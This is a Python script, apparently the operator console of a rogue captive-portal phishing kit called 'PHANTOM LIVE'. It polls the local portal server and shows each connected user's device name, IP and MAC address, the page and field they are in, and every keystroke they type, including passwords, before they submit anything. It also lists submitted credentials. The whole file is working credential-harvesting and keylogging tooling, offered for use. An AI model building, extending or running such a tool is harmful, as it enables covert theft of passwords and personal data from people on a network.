#!/usr/bin/env python3
"""Live typing viewer for the captive portal (stdlib only, no root needed).

Run in its own terminal (run.sh opens it in foot automatically):
    python3 live_view.py [--host 127.0.0.1] [--port 80]

Shows, per connected user, the name/IP/MAC, WHERE they are typing
(page + field), a live TYPING indicator with animation, every keystroke
as it arrives (even before submit — nothing needs to be submitted),
the current unsubmitted value of every field, the keystroke tape,
and recent submits.

Close with Ctrl+C or by closing the window.
Offline-safe: only polls localhost, no internet use.
"""
import argparse
import json
import os
import sys
import time
import urllib.request

# -- ANSI colors (disabled with --no-color or when not a tty) ---------------
PALETTE = {
    "reset": "\x1b[0m",
    "bold": "\x1b[1m",
    "dim": "\x1b[2m",
    "green": "\x1b[92m",
    "cyan": "\x1b[96m",
    "amber": "\x1b[93m",
    "red": "\x1b[91m",
    "faint": "\x1b[32m",
    "white": "\x1b[97m",
}
USE_COLOR = True


def c(name, text):
    if not USE_COLOR:
        return str(text)
    return PALETTE.get(name, "") + str(text) + PALETTE["reset"]


def fetch(url, timeout=3):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.read().decode(errors="ignore")
    except Exception:
        return None


def load_leases(path):
    """Parse dnsmasq.leases (expiry mac ip hostname clientid) -> {ip: name}."""
    names = {}
    if not path:
        return names
    try:
        with open(path, errors="ignore") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 4:
                    _exp, _mac, ip, host = parts[0], parts[1], parts[2], parts[3]
                    host = host.strip()
                    if ip and host and host != "*":
                        names[ip] = host
    except OSError:
        pass
    return names


def default_leases_path():
    here = os.path.dirname(os.path.abspath(__file__))
    for cand in (os.path.join(here, "run", "dnsmasq.leases"),
                 os.path.join(os.getcwd(), "run", "dnsmasq.leases")):
        if os.path.exists(cand):
            return cand
    return os.path.join(here, "run", "dnsmasq.leases")


TYPING_FRAMES = ["● TYPING.", "● TYPING..", "● TYPING..."]


def typing_state(active_ago):
    """Return (label, level) where level is 2=typing, 1=recent, 0=idle."""
    try:
        ago = float(active_ago)
    except (TypeError, ValueError):
        return ("idle", 0)
    if ago <= 3:
        return ("typing", 2)
    if ago <= 15:
        return ("recent", 1)
    return ("idle", 0)


KEY_SYMBOLS = {
    "Enter": "⏎",
    "Backspace": "⌫",
    "Tab": "⇥",
    " ": "␣",
    "Escape": "⎋",
    "Delete": "⌦",
    "ArrowLeft": "←",
    "ArrowRight": "→",
    "ArrowUp": "↑",
    "ArrowDown": "↓",
}


def tape_str(tape, now=None, limit=48):
    """Render last key events as a readable, colorized tape.

    Live-keylog behavior: every typed char must appear even when the
    sensor's `input` event carries key="" (the char lives in `value`).
    So an empty key falls back to the last char of the mirrored value —
    typing p23 renders "p23", not "···". Backspace/Delete inputTypes
    render as ⌫.
    """
    if now is None:
        now = time.time()
    out = []
    for e in (tape or [])[-24:]:
        k = e.get("key", "") or ""
        f = e.get("field", "") or ""
        t = e.get("type", "") or ""
        v = e.get("value", "") or ""
        try:
            fresh = (now - float(e.get("t", 0) or 0)) < 4
        except (TypeError, ValueError):
            fresh = False
        if t == "focus":
            s = "[%s]" % f[:18]
        elif t == "net":
            s = "{NET}"
        elif t in ("paste",):
            s = "⟪paste⟫"
        elif t in ("cut",):
            s = "⟪cut⟫"
        elif k in KEY_SYMBOLS:
            s = "<%s>" % KEY_SYMBOLS[k]
        elif len(k) == 1:
            s = k
        elif t == "binput" and k:
            # key holds e.data (char) or an inputType like
            # "insertText"/"deleteContentBackward".
            kl = k.lower()
            if "delete" in kl or "backward" in kl:
                s = "<%s>" % KEY_SYMBOLS["Backspace"]
            elif v:
                s = v[-1]
            elif len(k) <= 12:
                s = "<%s>" % k[:12]
            else:
                s = "·"
        elif k:
            s = "<%s>" % k[:12]
        elif t in ("input", "binput", "composition", "poll", "change") and v:
            # input events carry key="" — the typed char is value[-1].
            s = v[-1]
        elif t in ("input", "binput", "composition", "poll", "change"):
            s = "·"
        else:
            s = ""
        if not s:
            continue
        out.append(c("green", s) if fresh else c("faint", s))
    s = "".join(out)
    if len(s) > limit * 4:  # rough guard (ANSI codes inflate length)
        s = s[-(limit * 4):]
    return s or c("faint", "— idle —")


def suffix_diff(old, new):
    """Return (kept, fresh) splitting new into old-prefix + newly typed tail.

    If new extends old, fresh is the appended part. If new shrank or
    changed mid-string, fresh is "" and changed is True.
    """
    old = old or ""
    new = new or ""
    if new.startswith(old):
        return old, new[len(old):], False
    return new, "", True


def render_value(val, fresh_tail, is_active, changed):
    """Render a field value with caret + highlighted freshly-typed tail.

    val/fresh_tail are RAW strings; coloring is applied here so slicing
    never cuts through ANSI escape codes.
    """
    val = val or ""
    if not val:
        shown = c("faint", "(empty)")
    elif fresh_tail and val.endswith(fresh_tail):
        shown = c("white", val[:len(val) - len(fresh_tail)]) + \
            c("green", fresh_tail)
    else:
        shown = c("white", val)
    if changed and val:
        shown = c("amber", "⌫ ") + shown
    if is_active:
        shown = shown + c("green", "█")
    return shown


def render_user_card(num, ip, name, info, prev, frame, now):
    """Render one connected user's block. Returns list of lines."""
    lines = []
    mac = info.get("mac", "-") or "-"
    page = (info.get("page") or "-")[-70:]
    title = info.get("title") or ""
    active = info.get("active_field") or "-"
    ago = info.get("active_ago", "?")
    fields = info.get("fields") or {}
    label, level = typing_state(ago)

    if level == 2:
        tag = c("green", TYPING_FRAMES[frame % len(TYPING_FRAMES)])
    elif level == 1:
        tag = c("amber", "○ recent (%ss ago)" % ago)
    else:
        tag = c("faint", "○ idle (%ss ago)" % ago)

    header = "%s %s · %s (%s)  %s" % (
        c("bold", "[%d]" % num), c("white", name),
        c("cyan", ip), c("dim", mac), tag)
    lines.append(header)
    where = "  on: %s | %s  field: %s" % (
        c("dim", page), c("faint", title[:40]) if title else c("faint", "—"),
        c("cyan", active))
    lines.append(where)

    prev_fields = (prev.get("fields") or {}) if prev else {}
    for k in sorted(fields):
        v = fields[k] or ""
        is_active = (k == active)
        old_v = prev_fields.get(k, "")
        _kept, fresh, changed = suffix_diff(old_v, v)
        # Only animate the active field; others show plain values.
        if not is_active:
            fresh, changed = "", False
        lines.append("  %-14s %s" % (
            c("faint", k[:14]),
            render_value(v, fresh, is_active, changed)))
    if not fields:
        lines.append("  " + c("faint", "-- no fields captured yet --"))
    lines.append("  tape: %s" % tape_str(info.get("tape"), now=now))
    return lines


def render_incoming(rows_by_ip, names):
    """Render keystrokes that arrived since the previous poll."""
    lines = []
    total = sum(len(v) for v in rows_by_ip.values())
    if not total:
        return lines
    lines.append(c("green", "  >>> incoming keystrokes since last refresh:"))
    for ip in sorted(rows_by_ip):
        rows = rows_by_ip[ip][-8:]
        bits = []
        for r in rows:
            k = r.get("key", "") or ""
            f = r.get("field", "") or ""
            t = r.get("type", "") or ""
            v = r.get("value", "") or ""
            if len(k) == 1:
                bits.append(k)
            elif k in KEY_SYMBOLS:
                bits.append("<%s>" % KEY_SYMBOLS[k])
            elif t in ("input", "binput", "composition", "paste", "poll",
                       "change") and v:
                bits.append("[%s=%s]" % (f[:14], v[-24:]))
            elif t == "net":
                bits.append("{NET %s}" % v[:40])
            elif f:
                bits.append("[%s:%s]" % (f[:14], t))
        if bits:
            nm = names.get(ip, ip)
            lines.append("    %s: %s" % (c("cyan", "%s (%s)" % (nm, ip)),
                                         c("green", "".join(bits))))
    return lines


def snapshot(base, leases_path):
    """Fetch /live + /tape + /history + /submissions. Returns dict bundle."""
    live_raw = fetch(base + "/live")
    subs = fetch(base + "/submissions?limit=10")
    hist_raw = fetch(base + "/history?tail=2000")
    try:
        live = json.loads(live_raw) if live_raw else {}
    except Exception:
        live = {}
    try:
        hist = json.loads(hist_raw) if hist_raw else {}
    except Exception:
        hist = {}
    return {"live": live if isinstance(live, dict) else {},
            "hist": hist if isinstance(hist, dict) else {},
            "subs": subs,
            "names": load_leases(leases_path),
            "feed_ok": live_raw is not None}


def render_frame(snap, prev, state):
    """Build the full screen text. Mutates state (cursor/frame)."""
    live = snap["live"]
    hist = snap["hist"]
    subs = snap["subs"]
    names = snap["names"]
    now = time.time()
    frame = state.get("frame", 0)
    out = []

    # -- header ---------------------------------------------------------
    clock = time.strftime("%H:%M:%S")
    if snap["feed_ok"]:
        n_users = len(live) or len(hist)
        status = c("green", "● feed OK") + c("dim", " · %d user(s)" % n_users)
    else:
        status = c("red", "● FEED OFFLINE — is run.sh / portal running?")
    out.append(c("bold", "╔ PHANTOM LIVE") +
               c("dim", " — portal keystrokes, submit NOT required") +
               "  " + c("faint", clock))
    out.append("  " + status)
    out.append(c("faint", "─" * 70))

    # -- live keylog indicator (pre-submit, per section/field) --------------
    # One glanceable line per typer: IP + WHICH field/section + live value.
    # Typing "p23" in the password box shows `password=p23` here instantly —
    # no submit required.
    if live:
        out.append(c("bold", "LIVE KEYLOG") +
                   c("dim", " — unsubmitted, per section/field"))
        for ip in sorted(live):
            info = live[ip] or {}
            fields = info.get("fields") or {}
            lf = (info.get("live_field") or info.get("active_field") or "-")
            lv = info.get("live_value", fields.get(lf, ""))
            ago = info.get("active_ago", "?")
            _lab, level = typing_state(ago)
            if level == 2:
                ltag = c("green", "●TYPING")
            elif level == 1:
                ltag = c("amber", "○recent")
            else:
                ltag = c("faint", "○idle")
            nm = names.get(ip, "Unknown-Device")
            out.append("  %s %s %s=%s" % (
                ltag, c("cyan", "%s (%s)" % (nm, ip)),
                c("faint", str(lf)[:24]),
                c("green", str(lv)[-60:] or "(empty)")))
        out.append(c("faint", "─" * 70))

    # -- live users ------------------------------------------------------
    if live:
        out.append(c("bold", "LIVE TYPING"))
        for num, ip in enumerate(sorted(live), 1):
            info = live[ip] or {}
            name = names.get(ip, "Unknown-Device")
            out.extend(render_user_card(num, ip, name, info,
                                        prev.get(ip), frame, now))
            out.append("")
    else:
        out.append(c("faint", "(nothing typing right now — "
                              "open the portal on a client and type)"))

    # -- incoming keystrokes since last refresh --------------------------
    if state.get("incoming_lines"):
        out.extend(state.pop("incoming_lines"))

    # -- history fallback (buffer expired, keystrokes persist) ------------
    if not live and hist:
        out.append("")
        out.append(c("amber", "LAST SEEN (live buffer expired, from history):"))
        for num, ip in enumerate(
                sorted(hist, key=lambda i: (hist[i] or {}).get("last_epoch")
                       or 0, reverse=True)[:10], 1):
            e = hist[ip] or {}
            name = names.get(ip, "Unknown-Device")
            fields = "  |  ".join(
                "%s=[%s]" % (k, v)
                for k, v in (e.get("fields") or {}).items())
            out.append("%s %s · %s (%s) [%s]" % (
                c("bold", "[%d]" % num), c("white", name),
                c("cyan", ip), c("dim", e.get("mac", "-")),
                c("faint", e.get("last_ts", "?"))))
            if fields:
                out.append("  fields: %s" % fields)

    # -- submits ----------------------------------------------------------
    out.append("")
    out.append(c("bold", "SUBMITS (latest first)"))
    if subs:
        for line in reversed(subs.strip().splitlines()):
            out.append(c("amber", "▸ ") + line)
    else:
        out.append(c("faint", "(none yet)"))

    out.append("")
    out.append(c("faint", "[Ctrl+C to close]  "
                          "●=typing now  ○=recent/idle  █=cursor  "
                          "+tape shows every key incl. ⌫ ⏎"))
    state["frame"] = frame + 1
    return "\n".join(out)


def poll_incoming(base, state):
    """Fetch /tape rows newer than cursor; stash render lines in state."""
    url = base + "/tape?since=%s&limit=100" % state.get("since", 0)
    raw = fetch(url)
    if not raw:
        return
    try:
        rows = json.loads(raw)
    except Exception:
        return
    if not isinstance(rows, list):
        return
    grouped = {}
    newest = state.get("since", 0)
    for r in rows:
        if not isinstance(r, dict):
            continue
        try:
            ep = float(r.get("epoch", 0) or 0)
        except (TypeError, ValueError):
            continue
        if ep > state.get("since", 0):
            grouped.setdefault(r.get("ip", "?"), []).append(r)
        if ep > newest:
            newest = ep
    state["since"] = newest
    if grouped:
        state["incoming_lines"] = render_incoming(
            grouped, state.get("names", {}))


def main():
    global USE_COLOR
    ap = argparse.ArgumentParser(description="Portal live typing viewer")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--interval", type=float, default=1.0,
                    help="refresh seconds (default 1.0)")
    ap.add_argument("--leases", default=None,
                    help="path to dnsmasq.leases for device names")
    ap.add_argument("--no-color", action="store_true",
                    help="disable ANSI colors")
    ap.add_argument("--once", action="store_true",
                    help="print one snapshot and exit (no clear loop)")
    args = ap.parse_args()
    USE_COLOR = not args.no_color and sys.stdout.isatty()
    base = "http://%s:%d" % (args.host, args.port)
    leases_path = args.leases or default_leases_path()

    print("Portal LIVE view — Ctrl+C or close window to quit.", flush=True)
    if not args.once:
        time.sleep(1)

    prev = {}
    state = {"since": 0, "frame": 0, "names": {}}
    first = True
    while True:
        snap = snapshot(base, leases_path)
        state["names"] = snap["names"]
        if not first and not args.once:
            poll_incoming(base, state)
        else:
            # Prime the tape cursor without showing backlog as "incoming".
            raw = fetch(base + "/tape?since=0&limit=5")
            try:
                rows = json.loads(raw) if raw else []
                eps = [float(r.get("epoch", 0) or 0) for r in rows
                       if isinstance(r, dict)]
                if eps:
                    state["since"] = max(eps)
            except Exception:
                pass
        text = render_frame(snap, prev, state)
        prev = {ip: {"fields": dict((info or {}).get("fields") or {})}
                for ip, info in (snap["live"] or {}).items()}
        if args.once:
            print(text, flush=True)
            return
        os.system("clear")
        print(text, flush=True)
        first = False
        time.sleep(max(0.3, args.interval))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
